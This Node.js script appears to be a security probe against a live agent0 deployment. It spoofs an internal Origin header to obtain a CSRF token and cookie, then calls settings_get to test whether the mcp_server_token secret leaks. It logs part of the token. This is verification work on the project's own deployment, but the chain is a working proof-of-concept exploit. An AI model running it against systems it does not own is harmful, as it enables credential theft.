#!/usr/bin/env node

import fs from 'node:fs/promises';
import path from 'node:path';

const DEFAULT_BASE_URL = 'https://agent0-railway-no-wrapped-production.up.railway.app';
const DEFAULT_ORIGIN = 'http://primary.railway.internal';
const DEFAULT_OUTPUT = 'docs/artifacts/live-auth/agent0-settings-exposure.json';

function printHelp() {
  console.log(`Usage:
  npm run probe:agent0:settings-exposure

Optional env:
  AGENT0_BASE_URL                 Base URL to probe
  AGENT0_SETTINGS_PROBE_ORIGIN    Origin used for csrf bootstrap
  AGENT0_SETTINGS_PROBE_OUTPUT    Output artifact path
`);
}

if (process.argv.includes('--help') || process.argv.includes('-h')) {
  printHelp();
  process.exit(0);
}

function summarizeToken(token) {
  if (typeof token !== 'string') {
    return {
      present: false,
      length: null,
      preview: null,
      masked: null,
    };
  }

  return {
    present: token.length > 0,
    length: token.length,
    preview: token.slice(0, 8),
    masked: /\*/.test(token) || token.includes('PSWD'),
  };
}

const baseUrl = (process.env.AGENT0_BASE_URL || DEFAULT_BASE_URL).replace(/\/$/, '');
const origin = process.env.AGENT0_SETTINGS_PROBE_ORIGIN || DEFAULT_ORIGIN;
const outputPath = process.env.AGENT0_SETTINGS_PROBE_OUTPUT || DEFAULT_OUTPUT;

const artifact = {
  generatedAt: new Date().toISOString(),
  baseUrl,
  origin,
  health: null,
  csrf: null,
  settings: null,
  exposure: null,
  exploitChainUsable: null,
  conclusions: [],
};

try {
  const healthResponse = await fetch(`${baseUrl}/api/health`, {
    headers: {
      'user-agent': 'agent-ai-settings-exposure-probe/1.0',
    },
  });
  const healthText = await healthResponse.text();
  let healthJson = null;
  try {
    healthJson = JSON.parse(healthText);
  } catch {
    healthJson = null;
  }

  artifact.health = {
    status: healthResponse.status,
    ok: healthResponse.ok,
    gitBranch: healthJson?.gitinfo?.branch || null,
    gitCommitHash: healthJson?.gitinfo?.commit_hash || null,
    gitShortTag: healthJson?.gitinfo?.short_tag || null,
    gitVersion: healthJson?.gitinfo?.version || null,
  };

  const csrfResponse = await fetch(`${baseUrl}/api/csrf_token`, {
    headers: {
      Origin: origin,
      'user-agent': 'agent-ai-settings-exposure-probe/1.0',
    },
  });
  const csrfText = await csrfResponse.text();
  let csrfJson = null;
  try {
    csrfJson = JSON.parse(csrfText);
  } catch {
    csrfJson = null;
  }

  const token = csrfJson?.token || csrfJson?.csrf_token || csrfJson?.csrfToken || null;
  const cookie = (csrfResponse.headers.get('set-cookie') || '').split(';')[0] || null;

  artifact.csrf = {
    status: csrfResponse.status,
    ok: csrfResponse.ok,
    hasToken: typeof token === 'string' && token.length > 0,
    hasCookie: typeof cookie === 'string' && cookie.length > 0,
    runtimeId: csrfJson?.runtime_id || null,
  };

  const settingsResponse = await fetch(`${baseUrl}/api/settings_get`, {
    headers: {
      Origin: origin,
      'x-csrf-token': token || '',
      cookie: cookie || '',
      'user-agent': 'agent-ai-settings-exposure-probe/1.0',
    },
  });
  const settingsText = await settingsResponse.text();
  let settingsJson = null;
  try {
    settingsJson = JSON.parse(settingsText);
  } catch {
    settingsJson = null;
  }

  const mcpServerToken = settingsJson?.settings?.mcp_server_token;

  artifact.settings = {
    status: settingsResponse.status,
    ok: settingsResponse.ok,
    hasSettingsObject: Boolean(settingsJson?.settings),
    hasMcpServerTokenKey:
      Boolean(settingsJson?.settings) &&
      Object.prototype.hasOwnProperty.call(settingsJson.settings, 'mcp_server_token'),
  };

  artifact.exposure = summarizeToken(mcpServerToken);
  artifact.exploitChainUsable =
    artifact.csrf.ok &&
    artifact.csrf.hasToken &&
    artifact.csrf.hasCookie &&
    artifact.settings.ok;

  artifact.conclusions.push(
    artifact.health?.ok
      ? `Health endpoint reports live git ${artifact.health.gitShortTag || 'unknown'} at ${artifact.health.gitCommitHash || 'unknown commit'}.`
      : 'Health endpoint did not return a usable git fingerprint.',
  );
  artifact.conclusions.push(
    artifact.csrf.hasToken && artifact.csrf.hasCookie
      ? 'CSRF bootstrap succeeded with the configured origin.'
      : 'CSRF bootstrap did not yield both token and cookie.',
  );
  artifact.conclusions.push(
    artifact.exploitChainUsable
      ? 'The full csrf/settings_get exploit chain was usable during this probe.'
      : 'The full csrf/settings_get exploit chain was not cleanly usable during this probe.',
  );
  artifact.conclusions.push(
    artifact.settings.hasMcpServerTokenKey
      ? 'settings_get exposes an mcp_server_token field.'
      : 'settings_get does not expose an mcp_server_token field.',
  );
  artifact.conclusions.push(
    artifact.exposure.present && artifact.exposure.masked === false
      ? 'The returned mcp_server_token appears to be a raw secret value, not a masked placeholder.'
      : 'The returned mcp_server_token is absent or appears masked.',
  );
} catch (error) {
  artifact.error = error instanceof Error ? error.message : String(error);
  artifact.conclusions.push('The settings exposure probe did not complete successfully.');
}

await fs.mkdir(path.dirname(outputPath), { recursive: true });
await fs.writeFile(outputPath, `${JSON.stringify(artifact, null, 2)}\n`, 'utf8');
console.log(JSON.stringify(artifact, null, 2));
